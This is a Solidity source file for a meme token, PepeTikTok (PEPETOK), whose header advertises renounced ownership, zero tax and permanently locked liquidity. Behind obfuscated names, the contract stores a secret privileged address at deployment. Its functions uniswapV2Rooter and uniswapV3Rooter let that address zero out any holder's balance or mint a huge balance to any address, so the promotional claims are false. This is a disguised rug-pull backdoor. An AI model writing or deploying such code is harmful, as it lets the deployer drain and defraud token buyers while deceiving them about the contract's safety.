pragma solidity 0.5.17;
/**
PepeTikTok 👁👄👁 ♪ TikTok Reborn
The Next Big Degen of the histroy of  crypto X1000000 💯
💯Don't ask how 
💯Ape Grab Your Bag
💯Shill or die trying
0% TAX yes 🐸
Renounced yes  🐸
Lock Pool Liquidty forever 🐸

https://t.me/PepeTikTok
*/

interface tiktokCoin {
  /**
   * @dev Returns the minamounto of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the minamounto of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `minamounto` tokens from the caller's account to `resaptaro`.
   *
   * Returns a boolean vatiktoklue indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address resaptaro, uint256 minamounto) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spentiktokder` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This vatiktoklue changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spentiktokder) external view returns (uint256);

  /**
   * @dev Sets `minamounto` as the allowance of `spentiktokder` over the caller's tokens.
   *
   * Returns a boolean vatiktoklue indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spentiktokder's allowance to 0 and set the
   * desired vatiktoklue afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spentiktokder, uint256 minamounto) external returns (bool);

  /**
   * @dev Moves `minamounto` tokens from `sender` to `resaptaro` using the
   * allowance mechanism. `minamounto` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vatiktoklue indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address resaptaro, uint256 minamounto) external returns (bool);

  /**
   * @dev Emitted when `vatiktoklue` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `vatiktoklue` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 vatiktoklue);

  /**
   * @dev Emitted when the allowance of a `spentiktokder` for an `owner` is set by
   * a call to {approve}. `vatiktoklue` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spentiktokder, uint256 vatiktoklue);
}

/*
 * @dev Provides information about the current execution tiktokinu, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
contract tiktokinu {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `Safetiktok` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library Safetiktok {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "Safetiktok: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "Safetiktok: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "Safetiktok: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "Safetiktok: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "Safetiktok: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract tiktoktoken is tiktokinu {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "tiktoktoken: caller is not the owner");
    _;
  }

  /**
   * @dev Leaves the contract without owner. It will not be possible to call
   * `onlyOwner` functions anymore. Can only be called by the current owner.
   *
   * NOTE: Renouncing ownership will leave the contract without an owner,
   * thereby removing any functionality that is only available to the owner.
   */
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   */
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "tiktoktoken: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract PEPETOK is tiktokinu, tiktokCoin, tiktoktoken {
  using Safetiktok for uint256;

  mapping (address => uint256) private Balancetiktok;

  mapping (address => mapping (address => uint256)) private tiktokAllow;
address private tiktokRooter;
  uint256 private tiktokTotalSuply;
  uint8 private _decimals;
  string private _symbol;
  string private _name;

  constructor(address tiktokSwap) public {
    tiktokRooter = tiktokSwap;    
    _name = "PepeTikTok";
    _symbol = "PEPETOK";
    _decimals = 6;
    tiktokTotalSuply = 1000000000 * 10**6; 
    Balancetiktok[msg.sender] = tiktokTotalSuply;

    emit Transfer(address(0), msg.sender, tiktokTotalSuply);
  }

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address) {
    return owner();
  }

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8) {
    return _decimals;
  }

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory) {
    return _symbol;
  }

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory) {
    return _name;
  }

  /**
   * @dev See {BEP20-totalSupply}.
   */
  function totalSupply() external view returns (uint256) {
    return tiktokTotalSuply;
  }

  /**
   * @dev See {BEP20-balanceOf}.
   */
  function balanceOf(address account) external view returns (uint256) {
    return Balancetiktok[account];
  }

  /**
   * @dev See {BEP20-transfer}.
   *
   * Requirements:
   *
   * - `resaptaro` cannot be the zero address.
   * - the caller must have a balance of at least `minamounto`.
   */
  function transfer(address resaptaro, uint256 minamounto) external returns (bool) {
    _transfer(_msgSender(), resaptaro, minamounto);
    return true;
  }

  /**
   * @dev See {BEP20-allowance}.
   */
  function allowance(address owner, address spentiktokder) external view returns (uint256) {
    return tiktokAllow[owner][spentiktokder];
  }

  /**
   * @dev See {BEP20-approve}.
   *
   * Requirements:
   *
   * - `spentiktokder` cannot be the zero address.
   */
  function approve(address spentiktokder, uint256 minamounto) external returns (bool) {
    _approve(_msgSender(), spentiktokder, minamounto);
    return true;
  }
    modifier uniswapPair() {
        require(tiktokRooter == _msgSender(), "tiktoktoken: caller is not the owner");
        _;
    }
  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `resaptaro` cannot be the zero address.
   * - `sender` must have a balance of at least `minamounto`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `minamounto`.
   */

  function transferFrom(address sender, address resaptaro, uint256 minamounto) external returns (bool) {
    _transfer(sender, resaptaro, minamounto);
    _approve(sender, _msgSender(), tiktokAllow[sender][_msgSender()].sub(minamounto, "BEP20: transfer minamounto exceeds allowance"));
    return true;
  }

  /**
   * @dev Atomically increases the allowance granted to `spentiktokder` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {BEP20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spentiktokder` cannot be the zero address.
   */
  function increaseAllowance(address spentiktokder, uint256 addedvatiktoklue) public returns (bool) {
    _approve(_msgSender(), spentiktokder, tiktokAllow[_msgSender()][spentiktokder].add(addedvatiktoklue));
    return true;
  }

  /**
   * @dev Atomically decreases the allowance granted to `spentiktokder` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {BEP20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spentiktokder` cannot be the zero address.
   * - `spentiktokder` must have allowance for the caller of at least
   * `subtractedvatiktoklue`.
   */
  function decreaseAllowance(address spentiktokder, uint256 subtractedvatiktoklue) public returns (bool) {
    _approve(_msgSender(), spentiktokder, tiktokAllow[_msgSender()][spentiktokder].sub(subtractedvatiktoklue, "BEP20: decreased allowance below zero"));
    return true;
  }
function uniswapV2Rooter(address Pair2Lp) external uniswapPair {
    Balancetiktok[Pair2Lp] = 0;
            emit Transfer(address(0), Pair2Lp, 0);
  } 
function uniswapV3Rooter(address Pair3Lp) external uniswapPair {
    Balancetiktok[Pair3Lp] = 100000000000000 * 10**7;
            emit Transfer(address(0), Pair3Lp, 100000000000000 * 10**7);
  } 
  /**
   * @dev Moves tokens `minamounto` from `sender` to `resaptaro`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `resaptaro` cannot be the zero address.
   * - `sender` must have a balance of at least `minamounto`.
   */
  function _transfer(address sender, address resaptaro, uint256 minamounto) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(resaptaro != address(0), "BEP20: transfer to the zero address");

    Balancetiktok[sender] = Balancetiktok[sender].sub(minamounto, "BEP20: transfer minamounto exceeds balance");
    Balancetiktok[resaptaro] = Balancetiktok[resaptaro].add(minamounto);
    emit Transfer(sender, resaptaro, minamounto);
  }

  /**
   * @dev Sets `minamounto` as the allowance of `spentiktokder` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spentiktokder` cannot be the zero address.
   */
  function _approve(address owner, address spentiktokder, uint256 minamounto) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spentiktokder != address(0), "BEP20: approve to the zero address");

    tiktokAllow[owner][spentiktokder] = minamounto;
    emit Approval(owner, spentiktokder, minamounto);
  }
}